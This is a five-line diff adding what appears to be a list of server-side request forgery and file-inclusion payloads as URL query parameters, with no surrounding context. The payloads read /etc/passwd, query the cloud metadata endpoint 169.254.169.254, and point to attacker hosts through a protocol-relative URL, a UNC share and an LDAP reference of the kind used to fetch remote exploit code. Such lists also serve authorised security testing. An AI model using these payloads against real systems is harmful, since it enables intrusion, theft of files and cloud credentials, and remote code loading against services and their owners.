@@ -1,0 +1,5 @@
+?url=file:///etc/passwd
+?path=//evil.com/resource
+?src=http://169.254.169.254/
+?resource=\\attacker.com\share
+?target=ldap://evil.com/exploit
